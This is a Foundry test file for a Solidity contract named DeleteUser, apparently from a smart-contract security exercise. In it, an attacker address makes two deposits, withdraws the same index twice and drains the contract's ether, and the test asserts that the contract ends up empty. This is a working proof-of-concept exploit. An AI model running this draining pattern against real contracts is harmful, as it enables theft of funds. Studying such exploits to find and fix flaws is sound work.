// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/DeleteUser.sol";

contract DeleteUserTest is Test {
    address attacker = vm.addr(1);
    DeleteUser public deleteUser;

    function setUp() public {
        deleteUser = new DeleteUser();
        deleteUser.deposit{value: 1 ether}();
    }

    function testAttack() public {
        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        deleteUser.deposit{value: 1 ether}();

        vm.prank(attacker);
        deleteUser.deposit();

        vm.prank(attacker);
        deleteUser.withdraw(1);

        vm.prank(attacker);
        deleteUser.withdraw(1);

        assertEq(address(attacker).balance, 2 ether);
        assertEq(address(deleteUser).balance, 0);
    }

    receive() external payable {}
}
